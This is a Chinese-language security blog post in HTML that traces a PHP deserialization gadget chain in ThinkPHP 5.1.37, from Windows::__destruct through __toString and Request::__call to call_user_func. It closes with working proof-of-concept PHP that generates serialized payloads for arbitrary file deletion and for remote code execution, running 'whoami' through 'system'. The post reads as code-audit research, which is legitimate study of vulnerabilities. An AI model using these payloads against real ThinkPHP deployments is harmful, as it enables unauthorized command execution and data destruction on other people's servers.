<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    
    <title>
        ThinkPHP5.1.X反序列化利用链 |
        
        p0l1st&#39;s blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="漏洞环境ThinkPHP5.1.37 application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller;  class Index &amp;#123;     public function index()     &amp;#123;         $u &#x3D; unserialize($_">
<meta property="og:type" content="article">
<meta property="og:title" content="ThinkPHP5.1.X反序列化利用链">
<meta property="og:url" content="http://example.com/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
<meta property="og:site_name" content="p0l1st&#39;s blog">
<meta property="og:description" content="漏洞环境ThinkPHP5.1.37 application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller;  class Index &amp;#123;     public function index()     &amp;#123;         $u &#x3D; unserialize($_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821196.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821254.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821679.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821743.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821049.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821206.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821595.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821423.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821731.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821875.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821591.png">
<meta property="og:image" content="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/10.png">
<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822658.png">
<meta property="article:published_time" content="2024-07-08T04:05:40.000Z">
<meta property="article:modified_time" content="2024-08-22T10:22:06.133Z">
<meta property="article:author" content="p0l1st">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png">
    
    
    
        
            <link rel="stylesheet" href="http://example.com/css/markdown.css">
        
            <link rel="stylesheet" href="http://example.com/css/july.css">
        
    
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
</head>
<body>

<div id="banner-outer" class="hidden">
    <div id="banner-image" style="background-image: url()"></div>
    <img src="https://www.gravatar.com/avatar/7a585313ed855e8d652cbb3154a6056e?s=300&amp;d=mm&amp;r=g" id="avatar">
</div>

<div id="menu-outer">
    <div id="menu-inner">
        
            <a class="false" href="http://example.com/index.html">Home</a>
        
            <a class="false" href="http://example.com/archives/index.html">Archives</a>
        
            <a class="false" href="http://example.com/about/index.html">About</a>
        
    </div>
</div>

<div id="content-outer" class="container">
    <div id="content-inner">
        <article id="post">
    <h1 id="post-title">ThinkPHP5.1.X反序列化利用链</h1>
    <time id="post-date" datetime="2024-07-08T04:05:40.000Z">
        July 08, 2024
    </time>
    <div id="post-content" class="markdown-body">
        <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>ThinkPHP5.1.37</p>
<p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
<pre><code class="php">&lt;?php
namespace app\index\controller;

class Index
&#123;
    public function index()
    &#123;
        $u = unserialize($_GET[&#39;c&#39;]);
        return &#39;hhh&#39;;
    &#125;

    public function hello($name = &#39;ThinkPHP5&#39;)
    &#123;
        return &#39;hello,&#39; . $name;
    &#125;
&#125;
</code></pre>
<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
<li>有一个内容完全可控的反序列化点:unserialize(可控变量)</li>
<li>存在文件上传、文件名可控、使用了文件操作函数:file_exists(‘phar:&#x2F;&#x2F;‘)</li>
</ul>
<h1 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h1><p>首先全局搜索_destruct()</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png" alt="image-20240708121433119"></p>
<p>然后跟进windows类的_destruct方法，发现调用了removeFiles方法，继续跟进</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821196.png" alt="image-20240708121529761"></p>
<p>可以看到在这里使用了file_exists对filename进行判断，这里的filename是可控的，并且跟进file_exists可以发现filename被当作字符串，那么就会触发_toString方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821254.png" alt="image-20240708121618417"></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821679.png" alt="image-20240708121836989"></p>
<p>全局搜索可利用的_toString方法，选择Conversion类，发现调用了toJson方法，跟进看看</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821743.png" alt="image-20240708122013007"></p>
<p>又调用了toArray方法，继续跟进</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821049.png" alt="image-20240708122126632"></p>
<p>这里的$relation来自$this-&gt;data[$name]，$name来自$this-&gt;append，都是可控的</p>
<p>所以$relation-&gt;visible($name)就变成了：**可控类-&gt;visible(可控变量)**，接下来就需要找可利用的visible方法或_call方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821206.png" alt="image-20240708132448330"></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821595.png" alt="image-20240708132131155"></p>
<p>全局搜索并没有找到可以利用的visible，搜索_call发现Request类比较好利用，这里的call_user_func_array第一个参数可控，可以传入一个数组，构造call_user_func_array(array(任意类，任意方法), $args)就可以调用任意类的任意方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821423.png" alt="image-20240708133414554"></p>
<p>但是array_unshift($args, $this)把本类对象放在$args的第一个，我们需要寻找不受这个参数影响的方法</p>
<p>通过前面分析RCE漏洞我们知道Request类中的input方法可以通过调用filterValue进而调用call_user_func，但是$args的第一个元素是一个固定死的类对象，所以这里不能直接调用input方法，而应该寻找调用input的方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821731.png" alt="image-20240708135710657"></p>
<p>调用input的方法共有七处，这里选择Request类中的param方法</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821875.png" alt="image-20240708140724987"></p>
<p>继续寻找调用了param的方法，发现有isAjax和isPjax，它们传入param方法的第一个参数都可控</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821591.png" alt="image-20240708141254668"></p>
<p>至此漏洞链构造完成</p>
<p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/10.png" alt="10"></p>
<h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>任意文件删除</p>
<pre><code class="php">namespace think\process\pipes;

class Pipes&#123;

&#125;

class Windows extends Pipes
&#123;
private $files = [];

public function __construct()
&#123;
$this-&gt;files=[&#39;需要删除文件的路径&#39;];
&#125;
&#125;

echo base64_encode(serialize(new Windows()));
</code></pre>
<p>RCE</p>
<pre><code class="php">&lt;?php
namespace think;
abstract class Model&#123;
    protected $append = [];
    private $data = [];
    function __construct()&#123;
        $this-&gt;append = [&quot;poc&quot;=&gt;[&quot; &quot;,&quot; &quot;]];
        $this-&gt;data = [&quot;poc&quot;=&gt;new Request()];
    &#125;
&#125;
class Request
&#123;
    protected $hook = [];

    protected $filter = &quot;system&quot;;
    protected $mergeParam=true;
    protected $param = [];
    protected $config = [
        // 表单请求类型伪装变量
        &#39;var_method&#39;       =&gt; &#39;_method&#39;,
        // 表单ajax伪装变量
        &#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,
        // 表单pjax伪装变量
        &#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,
        // PATHINFO变量名 用于兼容模式
        &#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,
        // 兼容PATH_INFO获取
        &#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],
        // 默认全局过滤方法 用逗号分隔多个
        &#39;default_filter&#39;   =&gt; &#39;&#39;,
        // 域名根，如thinkphp.cn
        &#39;url_domain_root&#39;  =&gt; &#39;&#39;,
        // HTTPS代理标识
        &#39;https_agent_name&#39; =&gt; &#39;&#39;,
        // IP代理获取标识
        &#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,
        // URL伪静态后缀
        &#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,
    ];
    function __construct()&#123;
        $this-&gt;filter = &quot;system&quot;;//回调时调用的PHP函数
        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#39;&#39;];//在isAjax方法传递给param方法的$name绕过param方法的一些操作，但主要是为了绕过input方法里面对$data的改变
        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];//在__call里面调用isAjax
        $this-&gt;mergeParam=true;//绕过param方法里的一些操作
        $this-&gt;param=[&quot;whoami&quot;,&quot;&quot;];//input方法的$data,也是即将执行的命令
    &#125;
&#125;
namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
&#123;
    private $files = [];

    public function __construct()
    &#123;
        $this-&gt;files=[new Pivot()];
    &#125;
&#125;
namespace think\model;

use think\Model;

class Pivot extends Model
&#123;
&#125;
use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
?&gt;&lt;?php
namespace think\process\pipes&#123;
    class Windows
    &#123;
        private $files = [];

        public function __construct($files=[])
        &#123;
            $this-&gt;files = $files;
        &#125;
    &#125;
&#125;

namespace think\model\concern&#123;
    trait Conversion
    &#123;
        protected $visible = [];
        protected $relation = [];
    &#125;
    trait Attribute
    &#123;
        private $data = [];
        private $withAttr = [];
    &#125;
&#125;

namespace think&#123;
    use think\model\concern\Conversion;
    use think\model\concern\Attribute;
    abstract class Model
    &#123;
        use Conversion;
        use Attribute;

        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])
        &#123;
            $this-&gt;relation = $relation;
            $this-&gt;visible = $visible;
            $this-&gt;data = $data;
            $this-&gt;withAttr = $withAttr;
        &#125;
    &#125;
&#125;

namespace think\model&#123;
    use think\Model;
    class Pivot extends Model&#123;
        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])
        &#123;
            parent::__construct($relation,$visible,$data,$withAttr);
        &#125;
    &#125;
&#125;

namespace&#123;
    $relation = array(&quot;system&quot;=&gt;1);
    $visible = array(&quot;system&quot;=&gt;1);
    $data = array(&quot;system&quot;=&gt;&quot;whoami&quot;);
    $withAttr = array(&quot;system&quot;=&gt;&quot;system&quot;);
    $pivot = new think\model\Pivot($relation,$visible,$data,$withAttr);
    $windows = new think\process\pipes\Windows(array($pivot));
    echo urlencode(serialize($windows));
&#125;
</code></pre>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822658.png" alt="image-20240708142049120"></p>

    </div>
</article>

<div id="paginator">
    
</div>

    </div>
</div>

<div id="bottom-outer">
    <div id="bottom-inner">
        2019-2024 p0l1st 皖ICP备16011445号
    </div>
</div>

<div id="to-top">
    <i class="iconfont icon-up"></i>
</div>


    
        <script src="http://example.com/js/jquery-3.4.1.min.js"></script>
    
        <script src="http://example.com/js/highlight-9.13.1.min.js"></script>
    
        <script src="http://example.com/js/transition.js"></script>
    
        <script src="http://example.com/js/smooth-scroll.min.js"></script>
    



    <script>
      $(function () {
        $('#banner-outer').addClass('fade-out')
        $('#menu-outer').addClass('fade-show')

        $('pre').each(function (i, block) {
          hljs.highlightBlock(block);
        });
      })
    </script>


<script>
  $(function () {
    $(window).scroll(function () {
      if ($(window).scrollTop() > 150) {
        $("#to-top").fadeIn();
      } else {
        $("#to-top").fadeOut();
      }
    });
    $("#to-top").click(function () {
      $("body,html").animate({scrollTop: 0}, 500);
      return false;
    })
  })
</script>
</body>
</html>
